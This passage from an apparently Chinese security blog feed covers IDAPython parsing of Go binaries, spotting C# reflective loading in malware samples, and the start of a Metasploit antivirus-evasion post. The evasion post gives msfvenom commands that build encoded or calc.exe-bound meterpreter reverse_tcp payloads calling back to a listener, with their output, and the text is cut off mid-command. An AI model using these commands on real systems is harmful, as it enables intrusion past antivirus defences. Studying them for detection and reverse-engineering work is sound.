class="keyword">type</span>.kind &amp; <span class="type">RType</span>.<span class="type">KIND_MASK</span>] == "<span class="type">Ptr</span>":</div><div class="line">    ptr<span class="keyword">type</span> = <span class="type">PtrType</span>(rtype.addr+0x20,rtype)</div><div class="line">    ptr<span class="keyword">type</span>.parse()</div><div class="line">    <span class="keyword">if</span> ptr<span class="keyword">type</span>.stringtype_addr != 0:</div><div class="line">        self.stringtype_addr = ptrtype.stringtype_addr</div><div class="line">        </div><div class="line"></div><div class="line"># <span class="type">Struct</span> <span class="type">Type</span></div><div class="line"><span class="title">if</span> <span class="type">RType</span>.<span class="type">TYPE_KINDS</span>[r<span class="keyword">type</span>.kind &amp; <span class="type">RType</span>.<span class="type">KIND_MASK</span>] == "<span class="type">Struct</span>":</div><div class="line">    struct<span class="keyword">type</span> = <span class="type">StructType</span>(rtype)</div><div class="line">    struct<span class="keyword">type</span>.parse()</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之前说过复杂数据类型都是从rtype拓展而来，ptrType结构如下，所以当解析到kind为Ptr的时候，读取当前rtype+0x20处的数据，进行解析就是下一个rtype【图7】<br><figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">type</span> <span class="title">ptrType</span></span> <span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line">    rtype</div><div class="line">    elem *rtype <span class="comment">// pointer element (pointed at) type</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># <span class="type">Ptr</span> <span class="type">Type</span></div><div class="line"><span class="title">if</span> <span class="type">RType</span>.<span class="type">TYPE_KINDS</span>[r<span class="keyword">type</span>.kind &amp; <span class="type">RType</span>.<span class="type">KIND_MASK</span>] == "<span class="type">Ptr</span>":</div><div class="line">    ptr<span class="keyword">type</span> = <span class="type">PtrType</span>(rtype.addr+0x20,rtype)</div><div class="line">    ptr<span class="keyword">type</span>.parse()</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>    <img src="http://hacky.wang/blog/20210711/JF2kARJlfI5a.png?imageslim" alt="mark"></p><h3 id="0x04-3-Struct-解析"><a href="#0x04-3-Struct-解析" class="headerlink" title="0x04-3 Struct 解析"></a>0x04-3 Struct 解析</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;structType如下，只需要依次解析位于偏移0x20的pkgPath和偏移位于0x24的fields两个成员即可。<br><figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">type</span> <span class="title">structType</span></span> <span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line">    rtype</div><div class="line">    pkgPath name          <span class="comment">// !! pointer</span></div><div class="line">    fields  []structField <span class="comment">// sorted by offset</span></div><div class="line">&#125;</div><div class="line"><span class="comment">////////////////////////////////</span></div><div class="line">    def __init__(<span class="keyword">self</span>,rtype):</div><div class="line">        <span class="keyword">self</span>.rtype_pkgpath_addr = rtype.addr+<span class="number">0x20</span></div><div class="line">        <span class="keyword">self</span>.pkgpath_addr = <span class="number">0</span></div><div class="line">        <span class="keyword">self</span>.pkgpath = <span class="string">""</span></div><div class="line">        <span class="keyword">self</span>.rtype_structField_addr = rtype.addr+<span class="number">0x24</span></div><div class="line">        <span class="keyword">self</span>.structField_addr = <span class="number">0</span></div><div class="line">        <span class="keyword">self</span>.rtype = rtype</div><div class="line"></div><div class="line">    def parse(<span class="keyword">self</span>):</div><div class="line">        common._info(<span class="string">"\t\t\t  Struct:%s start\t\t\t  "</span> % <span class="keyword">self</span>.rtype.Name.name_str)</div><div class="line">        <span class="keyword">self</span>.parse_pkgpath()</div><div class="line">        idc.MakeComm(<span class="keyword">self</span>.rtype_pkgpath_addr,<span class="string">"rtype.pkgpath @0x%x"</span> % <span class="keyword">self</span>.pkgpath_addr)</div><div class="line"></div><div class="line">        <span class="keyword">self</span>.parse_fields()</div><div class="line">        idc.MakeComm(<span class="keyword">self</span>.rtype_structField_addr,<span class="string">"rtype.structField @0x%x"</span> % <span class="keyword">self</span>.structField_addr)</div><div class="line">        common._info(<span class="string">"\t\t\t  Struct:%s end\t\t\t  "</span> % <span class="keyword">self</span>.rtype.Name.name_str)</div></pre></td></tr></table></figure></p><h2 id="0x05-String类型遍历和解析"><a href="#0x05-String类型遍历和解析" class="headerlink" title="0x05 String类型遍历和解析"></a>0x05 String类型遍历和解析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String暂时只解析常量string和字符串变量。</p><h3 id="0x05-1-const-string-解析"><a href="#0x05-1-const-string-解析" class="headerlink" title="0x05-1 const string 解析"></a>0x05-1 const string 解析</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;const 主要是通过代码匹配实现的。如下所示,const string 在进行使用的时候，都会将字符串长度传入栈中，只需要暴力匹配即可。另外go_parser的这部分是从 golang_loader_assist 移植而来，但是缺少了一个寄存器，导致部分string匹配不上。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">.text:</span>0048D16D                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, aHelloWorld2 <span class="comment">; "hello,World2!"</span></div><div class="line"><span class="symbol">.text:</span>0048D173                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">50h</span>+var_50], <span class="built_in">eax</span></div><div class="line"><span class="symbol">.text:</span>0048D176                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">50h</span>+var_4C], <span class="number">0Dh</span></div><div class="line"><span class="symbol">.text:</span>0048D17E                 <span class="keyword">call</span>    runtime_convTstring</div></pre></td></tr></table></figure></p><h3 id="0x05-1-ptr-string-解析"><a href="#0x05-1-ptr-string-解析" class="headerlink" title="0x05-1 ptr string 解析"></a>0x05-1 ptr string 解析</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;go_parser关于ptr 解析好像也是暴力匹配，但是J!4Yu师傅提出利用string交叉引用来解析ptrstring的方法。<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">另外一个可以考虑的思路，是遍历上面提到的 <span class="built_in">string</span> 类型定义的交叉引用，然后看看有没有如上的汇编指令片段的 Pattern。如果一段汇编代码中拿 <span class="built_in">string</span> 类型定义去解析一个字符串，那么就可以顺藤摸瓜找到字符串指针，字符串指针的地址后面紧挨着就是字符串的长度，这样也可以把字符串解析出来。感兴趣的师傅可以验证一下。</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在解析type的时候暂时存了stringtype_addr的地址，然后进行交叉引用，找到所有的引用。然后判断下面四个条件即可：<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">idc.print_insn_mnem(<span class="keyword">addr</span>) ==<span class="string">"lea"</span></div><div class="line">idc.<span class="type">GetOpnd</span>(<span class="keyword">addr</span>, <span class="number">0</span>) <span class="keyword">in</span> <span class="type">StringParse</span>.<span class="type">VALID_REGS</span> </div><div class="line">idc.<span class="type">GetOpnd</span>(<span class="keyword">addr</span>, <span class="number">0</span>) == idc.<span class="type">GetOpnd</span>(idc.<span class="type">FindCode</span>(<span class="keyword">addr</span>, idaapi.<span class="type">SEARCH_DOWN</span>), <span class="number">1</span>)</div><div class="line">'off_' <span class="keyword">in</span> idc.<span class="type">GetOpnd</span>(idc.<span class="type">FindCode</span>(idc.<span class="type">FindCode</span>(<span class="keyword">addr</span>,idaapi.<span class="type">SEARCH_DOWN</span>),idaapi.<span class="type">SEARCH_DOWN</span>), <span class="number">1</span>):</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为name为string的其实有很多，或者kind为String的其实也有很多，所以当确定name带有String，且kind为string时，便是符合条件的type结构体。【图9】<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> name<span class="selector-class">.name_str</span> == <span class="string">"*string"</span> and RType<span class="selector-class">.TYPE_KINDS</span>[self<span class="selector-class">.kind</span> &amp; RType.KIND_MASK] ==<span class="string">"String"</span>:</div><div class="line">     self<span class="selector-class">.stringtype_addr</span> = self.addr</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>    <img src="http://hacky.wang/blog/20210711/GdlNogpBeuhl.png?imageslim" alt="mark"></p><p>Ref:<a href="https://www.anquanke.com/member/122079" target="_blank" rel="external">https://www.anquanke.com/member/122079</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-idapython-调试&quot;&gt;&lt;a href=&quot;#0x00-idapython-调试&quot; class=&quot;headerlink&quot; title=&quot;0x00 idapython 调试&quot;&gt;&lt;/a&gt;0x00 idapython 调试&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;配置好IDA 7.5 免安装版之后，可以正常使用idapython，但是在import idc会报错。修改&lt;code&gt;%IDA_7.5%\python\3\ida_idaapi.py&lt;/code&gt;文件，在第80行，添加如下：&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;sys&lt;span class=&quot;selector-class&quot;&gt;.modules&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&quot;__main__&quot;&lt;/span&gt;]&lt;span class=&quot;selector-class&quot;&gt;.IDAPYTHON_COMPAT_695_API&lt;/span&gt; = True&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;  &lt;img src=&quot;http://hacky.wang/blog/20210711/opAdW5ctvdze.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在vscode添加插件idacode&lt;br&gt;    &lt;img src=&quot;http://hacky.wang/blog/20210711/oAt11UWv7kxW.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在IDA pro 安装插件，在&lt;a href=&quot;https://github.com/ioncodes/idacode/releases&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/ioncodes/idacode/releases&lt;/a&gt;处下载。解压到%IDAPATH%/plugins中。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;编辑 &lt;code&gt;idacode_utils/settings.py&lt;/code&gt;，把 Python 的可执行文件路径改为自己电脑上 Python 的路径&lt;br&gt;    &lt;img src=&quot;http://hacky.wang/blog/20210711/yo6yEXmAtGx2.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;重新打开，在输出窗口就能看到是否成功，可能会提示缺少模块，可以通过Pip安装模块debugpy&lt;br&gt;    &lt;img src=&quot;http://hacky.wang/blog/20210711/e6bruJAYtJnm.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 安装成功就是这样的。&lt;br&gt;    &lt;img src=&quot;http://hacky.wang/blog/20210711/vIx9aM2Dq8tL.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Golang Reverse" scheme="https://findream.github.io/categories/Golang-Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>C# 反射注入总结</title>
    <link href="https://findream.github.io/2021/10/12/C#%E5%8F%8D%E5%B0%84%E6%80%BB%E7%BB%93/"/>
    <id>https://findream.github.io/2021/10/12/C#反射总结/</id>
    <published>2021-10-12T12:45:11.000Z</published>
    <updated>2022-07-22T12:10:24.904Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-C-反射注入总结"><a href="#0x00-C-反射注入总结" class="headerlink" title="0x00 C# 反射注入总结"></a>0x00 C# 反射注入总结</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;反射的流程一共有3种类型：CreateInstance类型，CallByName类型，Invoke类型。test<br><a id="more"></a></p><h2 id="0x01-CreateInstance类型"><a href="#0x01-CreateInstance类型" class="headerlink" title="0x01 CreateInstance类型"></a>0x01 CreateInstance类型</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;采用CreateInstance的C#反射，最终会通过调用Activator.CreateInstance实现反射注入的目的，在C#中CreateInstance函数具有多种重载，其中被使用于C#的是如下原型:第一个参数为type，表示需要创建的Object的类型，第二个参数是有对象组成的数组。<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">object</span>? CreateInstance (<span class="keyword">Type</span> <span class="keyword">type</span>, params <span class="keyword">object</span>?[]? args);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以采用CallByName函数获取对象的类型，CallByName可以在对象上执行方法，设置或者返回属性。<br>其函数原型如下：</p><ul><li>ObjectRef：是对于某个对象的引用</li><li>ProcName:对象上的函数或者方法名，<strong><em>此处在反射中一般使用GetType</em></strong></li><li>UseCallType:一个枚举类型</li><li>Args：一个对象数组<figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">object</span>? CallByName (<span class="keyword">object</span>? ObjectRef, <span class="keyword">string</span> ProcName, Microsoft.VisualBasic.CallType UseCallType, <span class="keyword">params</span> <span class="keyword">object</span>?[] Args);</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CallByName第一个参数是ObjectRef，可以使用GetObjectValue获取，微软的解释，该函数的作用为<strong><em>Boxes a value type.</em></strong>，查看下面的返回值信息，可以了解，该函数可以返回Object本身（obj itself）<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">object</span>? GetObjectValue (<span class="keyword">object</span>? obj);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如此，整个逻辑就清楚了，首先通过GetObjectValue函数，创建一个Object，接着调用CallByName函数，或者该对象的类型，最后调用CreateInstance创建一个实例，完成反射。<strong><em>整个流程最终会通过调用CreateInstance实现，所以可以直接搜索该函数来提高分析进度</em></strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如图，通过搜索CreateInstance，借助Dnspy的分析功能，得到该样本反射注入的流程【图1】，通过分析在public DebuggableAttribute函数中，分别调用了az()函数，和imimimimim()函数，imimimimim()函数最终调用CreateInstance创建实例，而az()函数会调用xxxxxxxxxxxxxxxxxx()函数，</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在xxxxxxxxxxxxxxxxxx()函数中，正如之前所说，会一次调用RuntimeHelpers.GetObjectValue(object_0)和Versioned.CallByName(object_0, string_0, callType_0, object_1)【分别在smethod_6和smethod_5中】;可以看到在smethod_6中，Args的反射注入特征很明显【图2】：</p><ul><li>第一：new了一个对象，这其实是反射加载的程序集</li><li>第二：第一个参数为load字符串。</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;而在smethod_5中，new的object为一个字符串，实际是加载程序集的所在的class。上述都可以作为快速确定是否是C#反射的特征【图3】</p><h2 id="0x02-CallByName类型"><a href="#0x02-CallByName类型" class="headerlink" title="0x02 CallByName类型"></a>0x02 CallByName类型</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之前讲过，CallByName可以执行对象上的方法，如图所示，首先加载了位于资源文件中的图片资源，然后通过 MessageEnum.fgh进行解密，得到字节数组，之后便调用 AppDomain.CurrentDomain.Load()进行加载，接着分别调用GetTypes()，GetMethods()获取方法，然后采用CallByName执行【图4】</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种类型可以通过Load()函数进行识别，亦可通过CallByName(),GetTypes()识别</p><h2 id="0x02-Invoke类型"><a href="#0x02-Invoke类型" class="headerlink" title="0x02 Invoke类型"></a>0x02 Invoke类型</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke()方法，可以执行指定的方法，如图所示，在smethod_58()最终调用Load()方法加载程序及，然后经过校验入口点之后，在smethod_61调用Invoke进行反射。【图5】</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种类型可以通过Load()方法和Invoke()方法进行识别。除此以外，还可以通过GetMethod函数获取Method，然后Invoke。</p><h2 id="0x04-InvokeMember类型"><a href="#0x04-InvokeMember类型" class="headerlink" title="0x04 InvokeMember类型"></a>0x04 InvokeMember类型</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InvokeMember()，可以执行指定的方法，和Invoke功能一样。如图所示，首先通过Load()加载程序集，然后调用GetTypes()获取类型，接着调用InvokeMember执行指定的函数。【图6】</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种类型和上述一样，可以通过Load()方法，GetTypes()方法，以及InvokeMember()方法进行识别，亦可通过InvokeMember方法的参数BindingFlags.InvokeMethod方法进行识别。</p><p>Ref:<a href="http://hskull.cn/2021/01/01/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901/#%E6%A0%B7%E6%9C%AC%E8%87%AA%E8%BA%AB%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90" target="_blank" rel="external">如何分析各种类型的恶意样本之–C#恶意样本分析技巧</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-C-反射注入总结&quot;&gt;&lt;a href=&quot;#0x00-C-反射注入总结&quot; class=&quot;headerlink&quot; title=&quot;0x00 C# 反射注入总结&quot;&gt;&lt;/a&gt;0x00 C# 反射注入总结&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;反射的流程一共有3种类型：CreateInstance类型，CallByName类型，Invoke类型。test&lt;br&gt;
    
    </summary>
    
      <category term="病毒分析" scheme="https://findream.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>Metasploit免杀和检测的一些思考</title>
    <link href="https://findream.github.io/2021/04/05/Metasploit%E5%85%8D%E6%9D%80%E5%92%8C%E6%A3%80%E6%B5%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B0%E6%80%9D%E8%80%83/"/>
    <id>https://findream.github.io/2021/04/05/Metasploit免杀和检测的一些新思考/</id>
    <published>2021-04-05T07:02:11.000Z</published>
    <updated>2021-11-02T13:51:39.340Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近在学习Metasploit相关的东西，主要是基于msfvenom免杀相关的学习，由于免杀技术日新月异，更新速度快。所以本文只抛砖引玉。欢迎各位师傅探讨交流学习。<br><a id="more"></a></p><h2 id="0x1-Metasploit基础知识"><a href="#0x1-Metasploit基础知识" class="headerlink" title="0x1 Metasploit基础知识"></a>0x1 Metasploit基础知识</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Metasploit Framework 简称msf，是一款开源的渗透测试平台框架，其开源地址位于<a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework</a>。Metasploit是跨平台的渗透测试框架，可以运行在windows，linux，macos操作系统下。以kali为例，Metasploit的路径位于/usr/share/metasploit-framework。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lib目录包含metasploit的一些基本库文件，其中值得关注的是msf。这些主要是实现Metasploit的主要代码。<br>   <img src="http://hacky.wang/blog/20210504/Xbwd6zxypVJ3.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;modules目录包含了渗透测试各个环节功能的模块，包含辅助模块(auxiliary)，渗透攻击模块(exploits),后渗透攻击模块(post)，空指令模块(nops)和编码器模块(encoders)。<br>   <img src="http://hacky.wang/blog/20210504/71pFr6T8OILN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;还有其他一些目录：plugins，tools，script等也同样重要，可以阅读《Metasploit渗透测试魔鬼训练营》进行了解。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Metasploit的payload(载荷)从传输模式上一共分为3种: singles(独立载荷)，stagers(传输器载荷),stage(传输体)。关于这三种载荷的区别很多文章也有提及。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfvenom是Metasploit的免杀模块，具体使用方法如下：<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Options:    </div><div class="line">-<span class="ruby">p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&amp;<span class="comment">#039;-&amp;#039;或者stdin指定     </span></span></div><div class="line"><span class="ruby">-l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all     </span></div><div class="line"><span class="ruby">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度     </span></div><div class="line"><span class="ruby">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)     </span></div><div class="line"><span class="ruby">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）     </span></div><div class="line"><span class="ruby">-a, --arch       &lt;architecture&gt;  指定payload的目标架构，这里x86是<span class="number">32</span>位，x64是<span class="number">64</span>位      </span></div><div class="line"><span class="ruby">-platform       &lt;platform&gt;      指定payload的目标平台     </span></div><div class="line"><span class="ruby">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度     </span></div><div class="line"><span class="ruby">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;<span class="comment">#039;\x00\xff&amp;#039;     </span></span></div><div class="line"><span class="ruby">-i, --iterations &lt;count&gt;         指定payload的编码次数     </span></div><div class="line"><span class="ruby">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件     </span></div><div class="line"><span class="ruby">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板     </span></div><div class="line"><span class="ruby">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行         </span></div><div class="line"><span class="ruby">--payload-options                列举payload的标准选项     </span></div><div class="line"><span class="ruby">-o, --out        &lt;path&gt;          保存payload     </span></div><div class="line"><span class="ruby">-v, --var-name   &lt;name&gt;          指定一个自定义的变量，以确定输出格式         </span></div><div class="line"><span class="ruby">--shellest                       最小化生成payload     </span></div><div class="line"><span class="ruby">-h, --help                       查看帮助选项         </span></div><div class="line"><span class="ruby">--help-formats                   查看msf支持的输出格式列表</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;而现在常见的免杀套路主要是以下几种类型：</p><ul><li>采用自编码的免杀方案</li><li>捆绑正常的软件的免杀方案</li><li>捆绑加自编码的免杀方案</li><li>多重编码的免杀方案</li><li>生成shellcode的免杀方案</li></ul><h2 id="0x2-我的免杀学习之路"><a href="#0x2-我的免杀学习之路" class="headerlink" title="0x2 我的免杀学习之路"></a>0x2 我的免杀学习之路</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文采用最常见的payload：windows/meterpreter/reverse_tcp。测试免杀的效果。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，采用自编码的免杀方案，这个方案的免杀强度取决于编码器的加密强度。但是随着yara规则的使用，单纯的依靠编码器进行免杀已经很容易被查杀了。<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">root@kali:~<span class="comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.199.237 -e x86/shikata_ga_nai -b '\x00' -i 10 -f exe &gt; reverse_tcp_encoder.exe</span></div><div class="line">No <span class="built_in">platform</span> was selected, choosing Msf::Module::Platform::Windows <span class="built_in">from</span> <span class="keyword">the</span> payload</div><div class="line">No Arch selected, selecting Arch: x86 <span class="built_in">from</span> <span class="keyword">the</span> payload</div><div class="line">Found <span class="number">1</span> compatible encoders</div><div class="line">Attempting <span class="built_in">to</span> encode payload <span class="keyword">with</span> <span class="number">10</span> iterations <span class="keyword">of</span> x86/shikata_ga_nai</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">360</span> (iteration=<span class="number">0</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">387</span> (iteration=<span class="number">1</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">414</span> (iteration=<span class="number">2</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">441</span> (iteration=<span class="number">3</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">468</span> (iteration=<span class="number">4</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">495</span> (iteration=<span class="number">5</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">522</span> (iteration=<span class="number">6</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">549</span> (iteration=<span class="number">7</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">576</span> (iteration=<span class="number">8</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">603</span> (iteration=<span class="number">9</span>)</div><div class="line">x86/shikata_ga_nai chosen <span class="keyword">with</span> final size <span class="number">603</span></div><div class="line">Payload size: <span class="number">603</span> <span class="keyword">bytes</span></div><div class="line">Final size <span class="keyword">of</span> exe <span class="built_in">file</span>: <span class="number">73802</span> <span class="keyword">bytes</span></div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20210505/rtFOkjfDht9E.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;基于捆绑正常软件的免杀方案也有着不错的免杀效果，但是还有继续改进的余地。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=192.168.199.237 -x Desktop/calc.exe -f exe &gt; Documents/reverse_tcp_kunbang.exe</div><div class="line"><span class="literal">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class="keyword">from</span> the payload</div><div class="line"><span class="literal">No</span> Arch selected, selecting Arch: x86 <span class="keyword">from</span> the payload</div><div class="line"><span class="literal">No</span> encoder <span class="keyword">or</span> badchars specified, outputting<span class="built_in"> raw </span>payload</div><div 